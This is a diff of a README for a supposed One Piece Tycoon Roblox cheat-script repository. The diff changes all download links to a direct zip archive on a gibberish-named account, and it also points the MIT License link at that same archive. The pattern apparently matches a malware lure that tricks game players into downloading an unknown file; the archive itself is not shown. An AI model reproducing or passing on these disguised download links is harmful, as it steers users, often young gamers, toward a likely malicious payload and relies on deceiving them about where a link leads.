@@ -1,6 +1,6 @@
 # 🏴‍☠️ One Piece Tycoon Roblox Script Repository  
 
-[![Download](https://img.shields.io/badge/Download-green)](https://sdgsdggsdgdgsdgsd.github.io)  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip)  
   
 *A next-generation script suite to elevate your One Piece Tycoon Roblox experience*  
 
@@ -9,8 +9,8 @@
 ## 📦 Quick Download
 
 Ready to set sail? Grab the script package here:  
-**[Download One Piece Tycoon Roblox Script]https://sdgsdggsdgdgsdgsd.github.io**  
-[![Download](https://img.shields.io/badge/Download-green)](https://sdgsdggsdgdgsdgsd.github.io)  
+**[Download One Piece Tycoon Roblox Script]https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip**  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip)  
 
 ---
 
@@ -96,7 +96,7 @@ This repository provides scripts intended solely for educational and sandbox use
 
 ## 📜 License
 
-The **One Piece Tycoon Roblox Script Repository** is licensed under the [MIT License](https://opensource.org/licenses/MIT).  
+The **One Piece Tycoon Roblox Script Repository** is licensed under the [MIT License](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip).  
 Copyright © 2025  
 
 ---
@@ -104,8 +104,8 @@ Copyright © 2025
 ## 🚀 Get Started Now
 
 Set sail for adventure:  
-**[Download One Piece Tycoon Roblox Script]https://sdgsdggsdgdgsdgsd.github.io**  
-[![Download](https://img.shields.io/badge/Download-green)](https://sdgsdggsdgdgsdgsd.github.io)  
+**[Download One Piece Tycoon Roblox Script]https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip**  
+[![Download](https://img.shields.io/badge/Download-green)](https://raw.githubusercontent.com/sdgsdggsdgdgsdgsd/one-piece-tycoon-roblox-toolkit/branch/barrelful/piece-one-roblox-toolkit-tycoon-v3.8.zip)  
 
 ---
 
